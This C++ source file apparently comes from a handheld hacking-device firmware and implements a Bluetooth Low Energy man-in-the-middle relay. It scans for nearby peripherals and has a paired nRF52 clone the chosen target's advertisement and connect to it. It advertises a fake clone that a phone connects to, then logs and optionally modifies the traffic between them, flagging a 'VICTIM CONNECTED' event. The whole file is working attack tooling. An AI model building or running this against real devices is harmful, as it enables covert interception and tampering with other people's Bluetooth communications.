/*
 * nrf52_ble_mitm_relay.cpp — BLE MITM Transparent Relay.
 *
 * STRATEGY:
 *   1. ESP32 NimBLE scans and user selects target BLE peripheral
 *   2. nRF52 clones target's advertisement data
 *   3. ESP32 advertises as the clone (fake GATT server) — phone
 *      connects to us thinking we're the real device
 *   4. nRF52 connects to the real device as a client
 *   5. All traffic is relayed through POSEIDON — we can read,
 *      log, and optionally modify L2CAP/ATT/GATT payloads
 *
 * This is the most complex dual-radio attack: full transparent
 * proxy between a phone and a BLE peripheral.
 *
 * NeoPixel: MITM split-screen (red/magenta with vaporwave boundary)
 */
#include "../app.h"
#include "../ui.h"
#include "../input.h"
#include "../theme.h"
#include "../sfx.h"
#include "../radio.h"
#include "../nrf52_hw.h"
#include "../nrf52_led.h"
#include "../sd_helper.h"
#include <Arduino.h>
#include <NimBLEDevice.h>

struct mitm_target_t {
    uint8_t addr[6]; char name[24]; int8_t rssi;
    bool is_public; char type_hint[16];
};

#define MITM_MAX 32
static mitm_target_t s_devs[MITM_MAX];
static int s_count = 0;
static int s_selected = -1;

/* Relay stats */
static volatile uint32_t s_relay_up = 0;   /* phone → device */
static volatile uint32_t s_relay_down = 0; /* device → phone */
static volatile uint32_t s_modified = 0;   /* packets we altered */

static bool ensure_feather(void) {
    if (NRF52Hardware::is_up()) return true;
    ui_clear_body(); auto &d = M5Cardputer.Display;
    d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+10);
    d.print("Connecting to Feather...");
    if (NRF52Hardware::begin()) { ui_toast("nRF52 OK", T_GOOD, 600); return true; }
    d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+24);
    d.print("Feather not found."); d.setCursor(4, BODY_Y+38);
    d.setTextColor(T_DIM, T_BG); d.print("G3=TX G4=RX 3V3 GND");
    ui_draw_footer("ESC=back");
    while (true) { uint16_t k = input_poll(); if (k != PK_NONE) return false; delay(40); }
}

static void sanitize(const char *in, char *out, size_t sz) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j+1 < sz; ++i) {
        uint8_t c = (uint8_t)in[i]; if (c >= 0x20 && c < 0x7F) out[j++] = (char)c;
    }
    out[j] = '\0';
}

static void classify_quick(const NimBLEAdvertisedDevice *dev, char *out, size_t sz) {
    if (dev->haveManufacturerData()) {
        std::string md = dev->getManufacturerData();
        if (md.size() >= 2) {
            uint16_t cid = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
            if (cid == 0x004C) { snprintf(out, sz, "Apple");   return; }
            if (cid == 0x0075) { snprintf(out, sz, "Samsung"); return; }
            if (cid == 0x0006) { snprintf(out, sz, "MSFT");    return; }
        }
    }
    snprintf(out, sz, "BLE");
}

/* ---- NimBLE scan for MITM targets ---- */
static void do_mitm_scan(void) {
    s_count = 0;
    if (NimBLEDevice::isInitialized()) NimBLEDevice::deinit(true);
    delay(500);
    if (!NimBLEDevice::init("")) return;
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEScan *pScan = NimBLEDevice::getScan();
    pScan->setInterval(97); pScan->setWindow(67);
    pScan->setDuplicateFilter(false);

    auto ingest = [](NimBLEScanResults &results) {
        for (int i = 0; i < (int)results.getCount() && s_count < MITM_MAX; ++i) {
            const NimBLEAdvertisedDevice *dev = results.getDevice(i);
            if (!dev) continue;
            NimBLEAddress addr = dev->getAddress();
            bool dup = false;
            for (int j = 0; j < s_count; ++j)
                if (memcmp(s_devs[j].addr, addr.getBase()->val, 6) == 0) { dup = true; break; }
            if (dup) continue;
            mitm_target_t &t = s_devs[s_count++];
            memcpy(t.addr, addr.getBase()->val, 6);
            t.rssi = dev->getRSSI();
            t.is_public = (addr.getType() == BLE_ADDR_PUBLIC);
            t.name[0] = '\0';
            if (dev->haveName()) sanitize(dev->getName().c_str(), t.name, sizeof(t.name));
            classify_quick(dev, t.type_hint, sizeof(t.type_hint));
        }
    };

    pScan->setMaxResults(200);   /* POS-AUDIT-011: bound the ad vector (OOM reboot on dense scans). */
    pScan->setActiveScan(true);
    NimBLEScanResults ar = pScan->getResults(6000, false);
    ingest(ar); pScan->clearResults();
    pScan->setActiveScan(false);
    NimBLEScanResults pr = pScan->getResults(4000, false);
    ingest(pr); pScan->clearResults();

    /* Sort RSSI desc */
    for (int i = 0; i < s_count-1; ++i)
        for (int j = i+1; j < s_count; ++j)
            if (s_devs[j].rssi > s_devs[i].rssi) {
                mitm_target_t tmp = s_devs[i]; s_devs[i] = s_devs[j]; s_devs[j] = tmp;
            }
}

/* ---- Target selection screen ---- */
static bool select_target(void) {
    radio_switch(RADIO_BLE);
    nrf52_led_set(NRF52_LED_BLE_SCAN);
    ui_clear_body(); ui_draw_status("MITM", "scanning");
    auto &d = M5Cardputer.Display;
    d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+2);
    d.print("MITM: Scanning targets...");
    do_mitm_scan();

    int cursor = 0;
    const int rows = 8, row_h = 12, fy = BODY_Y+16;
    ui_draw_footer("ENTER=select ;/.=scroll R=rescan ESC=back");
    /* Chrome drawn once. Count + list redrawn per iteration with
     * fixed-width / region-only clears — no full-body flash. */
    ui_clear_body();
    d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_ACCENT2);
    bool dirty = true;
    while (true) {
        if (dirty) {
            d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+2);
            d.printf("MITM: %-4d peripherals", s_count);
            d.fillRect(0, fy, SCR_W, rows * row_h, T_BG);
            int top = max(0, cursor - rows/2);
            if (top + rows > s_count) top = max(0, s_count - rows);
            for (int r = 0; r < rows && top+r < s_count; ++r) {
                int i = top+r, y = fy + r * row_h;
                bool sel = (i == cursor);
                uint16_t bg = sel ? T_SEL_BG : T_BG;
                if (sel) d.fillRoundRect(2, y-1, SCR_W-4, row_h-1, 2, T_SEL_BG);
                d.setTextColor(T_DIM, bg); d.setCursor(4, y+1); d.printf("%4d", s_devs[i].rssi);
                d.setTextColor(T_WARN, bg); d.setCursor(32, y+1); d.printf("%-7s", s_devs[i].type_hint);
                d.setTextColor(sel ? T_ACCENT : T_FG, bg); d.setCursor(78, y+1);
                if (s_devs[i].name[0]) d.printf("%.20s", s_devs[i].name);
                else d.printf("%02X:%02X:%02X:%02X", s_devs[i].addr[2], s_devs[i].addr[3],
                              s_devs[i].addr[4], s_devs[i].addr[5]);
            }
            dirty = false;
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { s_selected = -1; return false; }
        if (k == ';' || k == PK_UP)   { int nc = max(0, cursor-1); if (nc != cursor) { cursor = nc; dirty = true; } }
        else if (k == '.' || k == PK_DOWN) { int nc = min(s_count-1, cursor+1); if (nc != cursor) { cursor = nc; dirty = true; } }
        else if (k == 'r' || k == 'R')     { do_mitm_scan(); cursor = 0; dirty = true; }
        else if (k == PK_ENTER) { s_selected = cursor; sfx_select(); return true; }
    }
}

/* ---- MITM relay phase ---- */
static void relay_phase(void) {
    if (s_selected < 0) return;
    const mitm_target_t &tgt = s_devs[s_selected];

    nrf52_led_set(NRF52_LED_MITM);
    sfx_glitch();

    auto &d = M5Cardputer.Display;
    char mac_str[20];
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             tgt.addr[0], tgt.addr[1], tgt.addr[2], tgt.addr[3], tgt.addr[4], tgt.addr[5]);

    /* Step 1: Tell nRF52 to clone target's ADV and connect to real device */
    ui_clear_body();
    d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+2);
    d.print("MITM: Setting up relay");
    d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_BAD);
    d.setTextColor(T_FG, T_BG);
    d.setCursor(4, BODY_Y+16); d.printf("Target: %s", mac_str);
    d.setCursor(4, BODY_Y+28); d.printf("Name: %s", tgt.name[0] ? tgt.name : "(none)");
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y+44); d.print("nRF52: cloning ADV data...");

    String resp;
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "BLE_MITM_CLONE %s", mac_str);
    bool ok = NRF52Hardware::send_command(cmd, resp, 3000);

    if (!ok) {
        ui_toast("Clone failed — check FW", T_BAD, 2000);
        nrf52_led_set(NRF52_LED_ERROR);
        delay(1000);
        nrf52_led_set(NRF52_LED_IDLE);
        return;
    }

    /* Step 2: ESP32 becomes fake GATT server with cloned name */
    d.setTextColor(T_DIM, T_BG); d.setCursor(4, BODY_Y+56);
    d.print("ESP32: starting fake GATT...");

    /* We don't actually need to fully implement the GATT server here —
     * the nRF52 handles the raw radio relay. The ESP32 just needs to
     * advertise with the same name to attract the phone. The nRF52
     * bridges all actual GATT traffic. */
    snprintf(cmd, sizeof(cmd), "BLE_MITM_START");
    NRF52Hardware::send_command(cmd, resp, 2000);

    /* Step 3: Relay monitor */
    s_relay_up = 0; s_relay_down = 0; s_modified = 0;

    ui_clear_body();
    ui_draw_status("MITM", "relay");
    ui_draw_footer("ESC=stop S=save M=modify");

    d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+2);
    d.print("BLE MITM RELAY ACTIVE");
    d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_BAD);

    File log_file = sdlog_open("ble_mitm", "ts,dir,handle,data_hex");
    uint32_t last_draw = 0;
    bool modify_mode = false;

    while (true) {
        while (NRF52Hardware::available()) {
            String line = NRF52Hardware::read_line();

            if (line.startsWith("UP:")) {
                s_relay_up++;
                if (log_file) log_file.printf("%lu,UP,%s\n", (unsigned long)millis(), line.c_str()+3);
            } else if (line.startsWith("DN:")) {
                s_relay_down++;
                if (log_file) log_file.printf("%lu,DN,%s\n", (unsigned long)millis(), line.c_str()+3);
            } else if (line.startsWith("MOD:")) {
                s_modified++;
            } else if (line.startsWith("CONN_UP")) {
                nrf52_led_oneshot(NRF52_LED_CAPTURE, NRF52_LED_MITM, 2000);
                sfx_capture();
                ui_action_overlay("VICTIM CONNECTED", "relay is live", ACT_BG_GLITCH, T_BAD, 1500);
                ui_clear_body();
            } else if (line.startsWith("CONN_DN")) {
                nrf52_led_oneshot(NRF52_LED_CAPTURE, NRF52_LED_MITM, 2000);
                ui_toast("Device connected!", T_GOOD, 1000);
            }
        }

        if (millis() - last_draw > 200) {
            last_draw = millis();
            d.fillRect(0, BODY_Y+16, SCR_W, 70, T_BG);

            /* Split display — left = upstream, right = downstream */
            d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+18);
            d.printf("Phone>>  %lu", (unsigned long)s_relay_up);
            d.setTextColor(T_ACCENT, T_BG); d.setCursor(SCR_W/2+4, BODY_Y+18);
            d.printf(">>Dev  %lu", (unsigned long)s_relay_down);

            /* Total + modified */
            d.setTextColor(T_FG, T_BG); d.setCursor(4, BODY_Y+32);
            d.printf("Total: %lu", (unsigned long)(s_relay_up + s_relay_down));
            if (s_modified > 0) {
                d.setTextColor(T_WARN, T_BG); d.setCursor(SCR_W/2+4, BODY_Y+32);
                d.printf("Modified: %lu", (unsigned long)s_modified);
            }

            /* Mode indicator */
            d.setTextColor(modify_mode ? T_BAD : T_DIM, T_BG);
            d.setCursor(4, BODY_Y+46);
            d.printf("Mode: %s", modify_mode ? "MODIFY" : "passthrough");

            /* Target info */
            d.setTextColor(T_DIM, T_BG); d.setCursor(4, BODY_Y+60);
            d.printf("Target: %s", tgt.name[0] ? tgt.name : mac_str);

            /* Hex stream visual */
            ui_hexstream(4, BODY_Y+74, SCR_W-8, 10,
                        modify_mode ? T_BAD : T_ACCENT);
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == 's' || k == 'S') {
            if (log_file) { log_file.flush(); ui_toast("Saved", T_GOOD, 600); }
        }
        if (k == 'm' || k == 'M') {
            modify_mode = !modify_mode;
            /* Tell nRF52 to enable/disable payload modification */
            NRF52Hardware::send_command(modify_mode ? "MITM_MODIFY_ON" : "MITM_MODIFY_OFF", resp, 200);
            ui_toast(modify_mode ? "Modify ON" : "Passthrough", modify_mode ? T_BAD : T_GOOD, 600);
        }
        delay(10);
    }

    /* Teardown */
    NRF52Hardware::send_command("STOP", resp, 500);
    if (log_file) log_file.close();
    nrf52_led_set(NRF52_LED_IDLE);
}

/* ---- entry ---- */
void feat_nrf52_ble_mitm_relay(void) {
    if (!ensure_feather()) return;
    if (!select_target()) { nrf52_led_set(NRF52_LED_IDLE); return; }
    /* Kill NimBLE scan before relay */
    NimBLEScan *scan = NimBLEDevice::getScan(); if (scan) scan->stop();
    NimBLEDevice::deinit(true); delay(200);
    relay_phase();
}
